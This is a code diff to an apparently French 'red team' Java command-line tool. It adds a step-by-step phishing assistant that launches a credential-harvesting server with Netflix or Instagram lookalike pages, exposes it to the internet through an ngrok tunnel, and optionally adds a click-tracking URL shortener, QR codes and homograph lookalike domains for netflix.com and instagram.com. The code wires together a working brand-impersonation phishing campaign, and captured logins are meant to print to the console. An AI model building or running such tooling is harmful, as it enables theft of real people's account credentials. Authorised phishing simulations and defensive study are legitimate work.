@@ -12,6 +12,7 @@ import fr.redteam.phishing.HomographGenerator;
 import fr.redteam.phishing.QrCodeGenerator;
 import fr.redteam.recon.SubdomainTakeoverChecker;
 import fr.redteam.util.Ansi;
+import fr.redteam.util.NgrokHelper;
 import fr.redteam.web.CredentialHarvester;
 import fr.redteam.web.PhishingHttpServer;
 import fr.redteam.web.PhishingPageGenerator;
@@ -158,27 +159,152 @@ public class RedTeamCli {
     }
 
     private void runPhishingMenu(Scanner scan) {
-        while (true) {
-            System.out.println(Ansi.CYAN + "\n  " + SEP_THIN + Ansi.RESET);
-            System.out.println(Ansi.bold("  Phishing"));
-            System.out.println(Ansi.CYAN + "  " + SEP_THIN + Ansi.RESET);
-            System.out.println("  " + Ansi.green("[1]") + " Serveur phishing " + Ansi.dim("(Netflix/Instagram)"));
-            System.out.println("  " + Ansi.green("[2]") + " QR Code Generator " + Ansi.dim("(génère QR vers URL)"));
-            System.out.println("  " + Ansi.green("[3]") + " URL Shortener " + Ansi.dim("(tracking des clics)"));
-            System.out.println("  " + Ansi.green("[4]") + " Homograph Generator " + Ansi.dim("(domaines lookalike)"));
-            System.out.println("  " + Ansi.dim("[0] Retour"));
-            System.out.println(Ansi.CYAN + "  " + SEP_THIN + Ansi.RESET);
-            System.out.print("  " + Ansi.bold("Choix") + " › ");
-            String choice = scan.nextLine();
-            if (choice == null) break;
-            choice = choice.trim();
-            if ("0".equals(choice)) break;
-            if ("1".equals(choice)) { startPhishingServer(scan); continue; }
-            if ("2".equals(choice)) { runQrCodeGenerator(scan); continue; }
-            if ("3".equals(choice)) { startUrlShortener(scan); continue; }
-            if ("4".equals(choice)) { runHomographGenerator(scan); continue; }
+        runPhishingAssistant(scan);
+    }
+
+    /**
+     * Assistant phishing séquentiel : pose toutes les questions, puis lance localhost + ngrok avec les options choisies.
+     */
+    private void runPhishingAssistant(Scanner scan) {
+        System.out.println(Ansi.CYAN + "\n  " + SEP + Ansi.RESET);
+        System.out.println(Ansi.bold("  Assistant Phishing"));
+        System.out.println(Ansi.CYAN + "  " + SEP_THIN + Ansi.RESET);
+
+        // Étape 1 : Template
+        System.out.println("  " + Ansi.bold("1)") + " Choisissez le template :");
+        System.out.println("     " + Ansi.green("[1]") + " Netflix");
+        System.out.println("     " + Ansi.green("[2]") + " Instagram");
+        System.out.print("     Choix › ");
+        String tChoice = scan.nextLine();
+        if (tChoice == null) tChoice = "";
+        tChoice = tChoice.trim();
+        String[] names = PhishingPageGenerator.TEMPLATE_NAMES;
+        String template = null;
+        int tIdx = parseInt(tChoice, 0);
+        if (tIdx >= 1 && tIdx <= names.length) template = names[tIdx - 1];
+        else {
             System.out.println(Ansi.red("  ✗ Choix invalide."));
+            return;
         }
+
+        // Étape 2 : QR code
+        System.out.print("  " + Ansi.bold("2)") + " Générer un QR code ? (o/n) › ");
+        boolean wantQr = askYesNo(scan);
+
+        // Étape 3 : URL shortener
+        System.out.print("  " + Ansi.bold("3)") + " Activer l'URL shortener ? (o/n) › ");
+        boolean wantShortener = askYesNo(scan);
+
+        // Étape 4 : Homograph
+        System.out.print("  " + Ansi.bold("4)") + " Générer des domaines homographes ? (o/n) › ");
+        boolean wantHomograph = askYesNo(scan);
+
+        System.out.println(Ansi.CYAN + "  " + SEP_THIN + Ansi.RESET);
+        System.out.println(Ansi.bold("  Lancement en cours..."));
+        System.out.println(Ansi.CYAN + "  " + SEP_THIN + Ansi.RESET);
+
+        int port = 8080;
+        int shortenerPort = 9090;
+        PhishingHttpServer srv = null;
+        Process ngrokProcess = null;
+        boolean shortenerStarted = false;
+
+        try {
+            // Démarrer le serveur phishing
+            srv = new PhishingHttpServer("127.0.0.1", port, new PhishingPageGenerator(), new CredentialHarvester(), template);
+            srv.start();
+
+            // Lancer ngrok
+            ngrokProcess = NgrokHelper.startNgrok(port);
+            String publicUrl = null;
+            if (ngrokProcess != null) {
+                try {
+                    Thread.sleep(2500);
+                    publicUrl = NgrokHelper.getPublicUrl(5, 500);
+                } catch (InterruptedException e) {
+                    Thread.currentThread().interrupt();
+                }
+            }
+            if (publicUrl == null || publicUrl.isEmpty()) {
+                publicUrl = "http://127.0.0.1:" + port;
+                System.out.println(Ansi.yellow("  ⚠ ngrok non disponible, utilisation de " + publicUrl));
+            }
+
+            String finalUrl = publicUrl;
+            if (wantShortener) {
+                UrlShortener.startServer(shortenerPort, publicUrl);
+                shortenerStarted = true;
+                finalUrl = UrlShortener.getShortUrl(shortenerPort);
+            }
+
+            // QR code
+            String qrFilePath = null;
+            if (wantQr) {
+                Target qrTarget = new Target(publicUrl, -1);
+                Report qrReport = new DefaultReport();
+                modules.get("qrcodegenerator").run(qrTarget, qrReport);
+                for (String f : qrReport.getFindings()) {
+                    if (f.contains("Fichier généré:")) {
+                        qrFilePath = f.replaceFirst(".*Fichier généré:\\s*", "").replaceAll("\\[QrCodeGenerator\\]\\s*", "").trim();
+                        break;
+                    }
+                }
+            }
+
+            // Homograph (template = "netflix" ou "instagram", pas "netflix.com")
+            String domainForHomograph = "netflix".equals(template) ? "netflix.com" : "instagram.com";
+            java.util.List<String> homographVariants = new java.util.ArrayList<>();
+            if (wantHomograph) {
+                Target homTarget = new Target(domainForHomograph, -1);
+                Report homReport = new DefaultReport();
+                modules.get("homographgenerator").run(homTarget, homReport);
+                for (String f : homReport.getFindings()) {
+                    if (f.contains("  → ")) {
+                        String msg = f.replaceAll("\\[HomographGenerator\\]\\s*", "").replaceFirst("^\\s*→\\s*", "").trim();
+                        homographVariants.add(msg);
+                    }
+                }
+            }
+
+            // Récapitulatif
+            System.out.println(Ansi.GREEN + "\n  " + SEP + Ansi.RESET);
+            System.out.println(Ansi.bold("  ✓ Phishing actif"));
+            System.out.println(Ansi.GREEN + "  " + SEP_THIN + Ansi.RESET);
+            System.out.println("  " + Ansi.cyan("Template") + "   › " + Ansi.green(template));
+            System.out.println("  " + Ansi.cyan("URL ngrok") + "  › " + Ansi.bold(publicUrl));
+            if (wantShortener) {
+                System.out.println("  " + Ansi.cyan("Shortener") + " › " + Ansi.bold(finalUrl));
+            }
+            if (wantQr && qrFilePath != null) {
+                System.out.println("  " + Ansi.cyan("QR") + "       › " + Ansi.bold(qrFilePath));
+            }
+            if (wantHomograph && !homographVariants.isEmpty()) {
+                System.out.println("  " + Ansi.cyan("Homograph") + " › " + domainForHomograph + Ansi.dim(" (") + homographVariants.size() + Ansi.dim(" variantes)"));
+                for (int i = 0; i < Math.min(5, homographVariants.size()); i++) {
+                    System.out.println("    " + Ansi.dim("→ ") + homographVariants.get(i));
+                }
+                if (homographVariants.size() > 5) {
+                    System.out.println("    " + Ansi.dim("... et " + (homographVariants.size() - 5) + " autres"));
+                }
+            }
+            System.out.println(Ansi.dim("  Les identifiants et clics s'afficheront ici."));
+            System.out.println(Ansi.CYAN + "  " + SEP_THIN + Ansi.RESET);
+            System.out.print(Ansi.dim("  [Entrée] pour arrêter et revenir au menu › "));
+            scan.nextLine();
+
+        } catch (Exception e) {
+            System.out.println(Ansi.red("  ✗ Erreur: " + e.getMessage()));
+        } finally {
+            if (srv != null) srv.stop();
+            if (shortenerStarted) UrlShortener.stopServer();
+            if (ngrokProcess != null && ngrokProcess.isAlive()) ngrokProcess.destroyForcibly();
+        }
+    }
+
+    private static boolean askYesNo(Scanner scan) {
+        String line = scan.nextLine();
+        if (line == null) return false;
+        return line.trim().toLowerCase().startsWith("o") || line.trim().toLowerCase().equals("y");
     }
 
     private void startPhishingServer(Scanner scan) {
